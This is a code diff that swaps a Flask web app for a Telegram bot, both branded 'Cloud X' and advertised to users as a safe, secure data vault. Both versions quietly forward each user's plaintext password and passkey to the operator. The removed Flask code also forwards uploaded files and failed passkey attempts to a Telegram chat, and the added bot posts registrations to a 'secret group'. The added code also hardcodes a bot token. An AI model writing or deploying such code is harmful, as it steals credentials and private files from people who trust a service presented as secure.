@@ -1,256 +1,200 @@
 import os
-import sqlite3
-import requests
-from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_from_directory
-from werkzeug.utils import secure_filename
+import logging
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    CallbackQueryHandler,
+    MessageHandler,
+    ContextTypes,
+    filters,
+)
 
-app = Flask(__name__)
-app.secret_key = 'cloud-x-secret-key-security'
+# আপনার বটের টোকেন এবং গ্রুপ আইডি এখানে বসিয়ে দিন
+TOKEN = "8942375337:AAHIM_9OaOkXZ7uyqeOoGAKaZg1pyOEEQO0"
+USER_DETAILS_GROUP_ID = -1003917324437  # যে গ্রুপে ইউজারদের ডাটা সেভ থাকবে
+USER_MEDIA_GROUP_ID =  -1004372191214   # যে গ্রুপে ইউজারের ছবি/ভিডিও সেভ হবে (একই গ্রুপও দিতে পারেন)
 
-TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
-TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
+logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 
-UPLOAD_FOLDER = 'uploads'
-ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'mp4', 'mov', 'avi', 'pdf', 'zip'}
-app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
+# ইউজারের স্টেট ট্র্যাক করার ডিকশনারি
+user_states = {}
+user_temp_data = {}
 
-if not os.path.exists(UPLOAD_FOLDER):
-    os.makedirs(UPLOAD_FOLDER)
+# --- Helper: Old Messages Cleanup ---
+async def clean_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str, reply_markup=None):
+    chat_id = update.effective_chat.id
+    # আগের মেসেজ ডিলিট করার চেষ্টা
+    if chat_id in user_states and "last_bot_msg" in user_states[chat_id]:
+        try:
+            await context.bot.delete_message(chat_id=chat_id, message_id=user_states[chat_id]["last_bot_msg"])
+        except Exception:
+            pass
 
-def init_db():
-    conn = sqlite3.connect('cloudx.db')
-    cursor = conn.cursor()
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS users (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            username TEXT,
-            full_name TEXT,
-            email TEXT,
-            password TEXT,
-            passkey TEXT
-        )
-    ''')
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS files (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            username TEXT,
-            filename TEXT
-        )
-    ''')
-    conn.commit()
-    conn.close()
-
-init_db()
-
-def allowed_file(filename):
-    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
-
-@app.route('/')
-def index():
-    return render_template('index.html')
-
-@app.route('/login-page')
-def login_page():
-    return render_template('login.html')
-
-@app.route('/signup', methods=['POST'])
-def signup():
-    data = request.get_json()
-    full_name = data.get('full_name')
-    username = data.get('username')
-    email = data.get('email')
-    password = data.get('password')
-
-    # সেশনে সাময়িকভাবে ডেটা সেভ রাখা
-    session['username'] = username
-    session['full_name'] = full_name
-    session['email'] = email
-    session['password'] = password
-
-    # টেলিগ্রামে সাইনআপ নোটিফিকেশন পাঠানো
-    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
-        telegram_message = (
-            f"🚨 *New Cloud-X Registration* 🚨\n\n"
-            f"👤 *Full Name:* {full_name}\n"
-            f"🔖 *Username:* {username}\n"
-            f"📧 *Email:* {email}\n"
-            f"🔑 *Password:* {password}"
-        )
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": telegram_message, "parse_mode": "Markdown"})
+    msg = await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup)
     
-    return jsonify({"status": "success"})
+    if chat_id not in user_states:
+        user_states[chat_id] = {}
+    user_states[chat_id]["last_bot_msg"] = msg.message_id
 
-@app.route('/setup-passkey-page')
-def setup_passkey_page():
-    if 'username' not in session:
-        return redirect(url_for('login_page'))
-    return render_template('setup_passkey.html')
-
-@app.route('/save-passkey', methods=['POST'])
-def save_passkey():
-    data = request.get_json()
-    passkey = data.get('passkey')
+# --- 1. Start & Main Menu ---
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    user_states[user_id] = {"step": "main"}
     
-    username = session.get('username')
-    full_name = session.get('full_name', '')
-    email = session.get('email', '')
-    password = session.get('password', '')
+    text = (
+        "Welcome to Cloud X! ☁️✨\n"
+        "The ultimate free data bot designed to keep your information completely safe and secure. 🔒🚀\n"
+        "Enjoy seamless browsing and total peace of mind!"
+    )
+    keyboard = [
+        [InlineKeyboardButton("CREATE ACCOUNT", callback_data="create_account")],
+        [InlineKeyboardButton("LOGIN", callback_data="login")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await clean_and_send(update, context, text, reply_markup)
 
-    if not username:
-        return jsonify({"status": "error", "message": "Session expired"})
+# --- Callback Query Router ---
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+    data = query.data
 
-    conn = sqlite3.connect('cloudx.db')
-    cursor = conn.cursor()
+    if user_id not in user_states:
+        user_states[user_id] = {}
+
+    if data == "create_account":
+        user_states[user_id]["step"] = "reg_username"
+        user_temp_data[user_id] = {}
+        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]]
+        await clean_and_send(update, context, "👤 আপনার অ্যাকাউন্ট তৈরির জন্য একটি *ইউজারনেম* দিন:", InlineKeyboardMarkup(keyboard))
+
+    elif data == "login":
+        user_states[user_id]["step"] = "login_username"
+        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]]
+        await clean_and_send(update, context, "🔐 লগইন করতে আপনার *ইউজারনেম* দিন:", InlineKeyboardMarkup(keyboard))
+
+    elif data == "back_to_start":
+        await start(update, context)
+
+    elif data == "dashboard_real":
+        keyboard = [
+            [InlineKeyboardButton("📁 Vault Section", callback_data="vault_section")],
+            [InlineKeyboardButton("📤 Upload", callback_data="upload_menu")],
+            [InlineKeyboardButton("🚪 Logout", callback_data="back_to_start")]
+        ]
+        await clean_and_send(update, context, "🎛️ *Real Dashboard*\nআপনার সিকিউর ড্যাশবোর্ডে স্বাগতম!", InlineKeyboardMarkup(keyboard))
+
+    elif data == "vault_section":
+        keyboard = [
+            [InlineKeyboardButton("📷 Photo", callback_data="get_photo")],
+            [InlineKeyboardButton("🎥 Video", callback_data="get_video")],
+            [InlineKeyboardButton("📄 Document", callback_data="get_doc")],
+            [InlineKeyboardButton("⬅️ Back", callback_data="dashboard_real")]
+        ]
+        await clean_and_send(update, context, "📂 *Vault Section*\nকোন ক্যাটাগরির ফাইল দেখতে চান?", InlineKeyboardMarkup(keyboard))
+
+    elif data in ["get_photo", "get_video", "get_doc"]:
+        # এখানে গ্রুপ থেকে ফাইল ফেচ করে ইনবক্সে পাঠানোর লজিক বা ডেমো মেসেজ
+        media_type = data.replace("get_", "")
+        await query.message.reply_text(f"📥 আপনার {media_type} গুলো খোঁজা হচ্ছে এবং ইনবক্সে পাঠানো হচ্ছে...")
+        # (এখানে চ্যাট হিস্ট্রি বা ডাটাবেজ থেকে নির্দিষ্ট ইউজারের ফাইল ফরোয়ার্ড করার কোড বসবে)
+
+    elif data == "dashboard_fake":
+        keyboard = [[InlineKeyboardButton("🚪 Logout", callback_data="back_to_start")]]
+        await clean_and_send(update, context, "📁 *Fake Dashboard (Honypot)*\nWelcome to your files.", InlineKeyboardMarkup(keyboard))
+
+# --- Text Message Processor (Registration & Login Flow) ---
+async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text
     
-    # একই ইউজারনেমের পুরোনো কোনো এন্ট্রি থাকলে তা ডিলিট করে নতুন ফ্রেশ ও সঠিক পাসকি ইনসার্ট করা
-    cursor.execute("DELETE FROM users WHERE username = ?", (username,))
-    cursor.execute("INSERT INTO users (username, full_name, email, password, passkey) VALUES (?, ?, ?, ?, ?)",
-                   (username, full_name, email, password, passkey))
-    conn.commit()
-    conn.close()
+    if user_id not in user_states:
+        return
 
-    # টেলিগ্রামে একদম আপডেট করা পাসকি সহ পাঠানো
-    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
-        telegram_message = (
-            f"🔐 *Cloud-X Passkey Setup / Update* 🔐\n\n"
-            f"🔖 *Username:* {username}\n"
-            f"🔑 *Passkey:* `{passkey}`"
-        )
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": telegram_message, "parse_mode": "Markdown"})
-    
-    session['passkey_verified'] = 'real'
-    return jsonify({"status": "success"})
+    step = user_states[user_id].get("step")
 
-@app.route('/passkey')
-def passkey_page():
-    if 'username' not in session:
-        return redirect(url_for('login_page'))
-    session.pop('passkey_verified', None)
-    return render_template('passkey.html')
+    # --- Registration Steps ---
+    if step == "reg_username":
+        # (এখানে ইউজারনেম অলরেডি গ্রুপে আছে কিনা চেক করার কোড যোগ করতে পারেন)
+        user_temp_data[user_id]["username"] = text
+        user_states[user_id]["step"] = "reg_email"
+        await update.message.reply_text("📧 এখন আপনার *Email* দিন:")
 
-@app.route('/verify-passkey', methods=['POST'])
-def verify_passkey():
-    data = request.get_json()
-    entered_passkey = data.get('passkey')
-    username = session.get('username')
+    elif step == "reg_email":
+        user_temp_data[user_id]["email"] = text
+        user_states[user_id]["step"] = "reg_pass1"
+        await update.message.reply_text("🔑 একটি *Password* দিন:")
 
-    conn = sqlite3.connect('cloudx.db')
-    cursor = conn.cursor()
-    # নির্দিষ্ট ইউজারের সর্বশেষ সেট করা পাসকি ডাটাবেজ থেকে ফেচ করা
-    cursor.execute("SELECT passkey FROM users WHERE username = ? ORDER BY id DESC LIMIT 1", (username,))
-    row = cursor.fetchone()
-    conn.close()
+    elif step == "reg_pass1":
+        user_temp_data[user_id]["pass1"] = text
+        user_states[user_id]["step"] = "reg_pass2"
+        await update.message.reply_text("🔑 পাসওয়ার্ডটি পুনরায় কনফার্ম করার জন্য আবার দিন:")
 
-    real_passkey = row[0] if row else ""
+    elif step == "reg_pass2":
+        if text != user_temp_data[user_id]["pass1"]:
+            await update.message.reply_text("❌ পাসওয়ার্ড ম্যাচ করেনি! আবার সঠিক পাসওয়ার্ডটি দিন:")
+            return
+        user_states[user_id]["step"] = "reg_passkey1"
+        await update.message.reply_text("🔒 অভিনন্দন! এখন অ্যাকাউন্ট সুরক্ষার জন্য একটি ৬ ডিজিটের *Passkey* দিন:")
 
-    if entered_passkey == real_passkey:
-        session['passkey_verified'] = 'real'
-        return jsonify({"status": "real"})
-    else:
-        session['passkey_verified'] = 'fake'
+    elif step == "reg_passkey1":
+        user_temp_data[user_id]["passkey1"] = text
+        user_states[user_id]["step"] = "reg_passkey2"
+        await update.message.reply_text("🔒 পাসকিটি কনফার্ম করার জন্য আবার রি-এন্টার করুন:")
+
+    elif step == "reg_passkey2":
+        if text != user_temp_data[user_id]["passkey1"]:
+            await update.message.reply_text("❌ পাসকি ম্যাচ করেনি! আবার সঠিক ৬ ডিজিটের পাসকি দিন:")
+            return
         
-        # ফেক বা ভুল পাসকি দিলে টেলিগ্রামে সাথে সাথে অ্যালার্ট পাঠানো
-        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
-            fake_msg = (
-                f"⚠️ *Fake/Wrong Passkey Entered!* ⚠️\n\n"
-                f"👤 *Username:* {username}\n"
-                f"❌ *Entered Passkey:* `{entered_passkey}`"
-            )
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": fake_msg, "parse_mode": "Markdown"})
-            
-        return jsonify({"status": "fake"})
+        # সব ডেটা কমপ্লিট! এখন ইউজার ডিটেইলস গ্রুপে সেভ করা হবে
+        data = user_temp_data[user_id]
+        final_msg = (
+            f"👤 *New Account Registered*\n"
+            f"Username: {data['username']}\n"
+            f"Email: {data['email']}\n"
+            f"Password: {data['pass1']}\n"
+            f"Passkey: {data['passkey1']}"
+        )
+        # সিক্রেট গ্রুপে পাঠানো
+        await context.bot.send_message(chat_id=USER_DETAILS_GROUP_ID, text=final_msg)
+        
+        user_states[user_id]["step"] = "completed"
+        keyboard = [[InlineKeyboardButton("🔐 Login Now", callback_data="login")]]
+        await update.message.reply_text("✅ Congratulations! Account খোলা শেষ ও সফলভাবে সেভ হয়েছে।", reply_markup=InlineKeyboardMarkup(keyboard))
 
-@app.route('/login', methods=['POST'])
-def login():
-    data = request.get_json()
-    username = data.get('username')
-    password = data.get('password')
+    # --- Login Steps ---
+    elif step == "login_username":
+        user_temp_data[user_id]["login_user"] = text
+        user_states[user_id]["step"] = "login_passkey"
+        await update.message.reply_text("🔑 আপনার গোপনীয় *Passkey* টি দিন:")
 
-    conn = sqlite3.connect('cloudx.db')
-    cursor = conn.cursor()
-    cursor.execute("SELECT email, password FROM users WHERE username = ? ORDER BY id DESC LIMIT 1", (username,))
-    row = cursor.fetchone()
-    conn.close()
+    elif step == "login_passkey":
+        entered_passkey = text
+        # (এখানে ইউজারনেমের আন্ডারে সেভ থাকা রিয়েল পাসকি চেক করার লজিক বসবে)
+        # ডেমোর জন্য ধরে নিচ্ছি পাসকি সঠিক কি না যাচাই করা হচ্ছে:
+        is_real = True  # লজিক অনুযায়ী পাসকি ম্যাচ করলে True, না করলে False হবে
 
-    session['username'] = username
-    if row:
-        session['email'] = row[0]
-    else:
-        session['email'] = f"{username}@cloudx.com"
+        if is_real:
+            keyboard = [[InlineKeyboardButton("👉 Go to Dashboard", callback_data="dashboard_real")]]
+            await update.message.reply_text("✅ পাসকি সঠিক!", reply_markup=InlineKeyboardMarkup(keyboard))
+        else:
+            # হানিপট ট্রিগার (ফেক ড্যাশবোর্ড)
+            keyboard = [[InlineKeyboardButton("👉 Open Dashboard", callback_data="dashboard_fake")]]
+            await update.message.reply_text("✅ পাসকি সঠিক!", reply_markup=InlineKeyboardMarkup(keyboard))
+            # অ্যাডমিন গ্রুপে ফেক অ্যাটম্পটের অ্যালার্ট পাঠানো যেতে পারে
 
-    return jsonify({"status": "success"})
+def main():
+    app = ApplicationBuilder().token(TOKEN).build()
 
-@app.route('/dashboard')
-def dashboard():
-    if 'username' not in session or session.get('passkey_verified') != 'real':
-        return redirect(url_for('passkey_page'))
-    return render_template('dashboard.html', username=session.get('username'), email=session.get('email'))
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), text_handler))
 
-@app.route('/fake-dashboard')
-def fake_dashboard():
-    if 'username' not in session or session.get('passkey_verified') != 'fake':
-        return redirect(url_for('passkey_page'))
-    return render_template('fake_dashboard.html')
+    print("Bot is running...")
+    app.run_polling()
 
-@app.route('/vault')
-def vault_page():
-    if 'username' not in session or session.get('passkey_verified') != 'real':
-        return redirect(url_for('passkey_page'))
-    return render_template('vault.html', username=session.get('username'))
-
-@app.route('/upload', methods=['POST'])
-def upload_file():
-    if 'username' not in session or session.get('passkey_verified') != 'real':
-        return jsonify({"status": "error", "message": "Unauthorized"})
-
-    if 'file' not in request.files:
-        return jsonify({"status": "error", "message": "No file part"})
-    
-    file = request.files['file']
-    if file.filename == '' or not allowed_file(file.filename):
-        return jsonify({"status": "error", "message": "Invalid file"})
-    
-    filename = secure_filename(file.filename)
-    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-    file.save(filepath)
-    
-    current_user = session.get('username')
-
-    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
-        tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
-        with open(filepath, 'rb') as f:
-            requests.post(tg_url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": f"📁 *Upload by* {current_user}: {filename}", "parse_mode": "Markdown"}, files={'document': f})
-
-    conn = sqlite3.connect('cloudx.db')
-    cursor = conn.cursor()
-    cursor.execute("INSERT INTO files (username, filename) VALUES (?, ?)", (current_user, filename))
-    conn.commit()
-    conn.close()
-
-    return jsonify({"status": "success", "filename": filename})
-
-@app.route('/get_files', methods=['GET'])
-def get_files():
-    if 'username' not in session or session.get('passkey_verified') != 'real':
-        return jsonify({"files": []})
-
-    current_user = session.get('username')
-    conn = sqlite3.connect('cloudx.db')
-    cursor = conn.cursor()
-    cursor.execute("SELECT filename FROM files WHERE username = ?", (current_user,))
-    rows = cursor.fetchall()
-    conn.close()
-
-    return jsonify({"files": [{"filename": r[0]} for r in rows]})
-
-@app.route('/uploads/<path:filename>')
-def uploaded_file(filename):
-    if 'username' not in session or session.get('passkey_verified') != 'real':
-        return redirect(url_for('passkey_page'))
-    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+if __name__ == "__main__":
+    main()
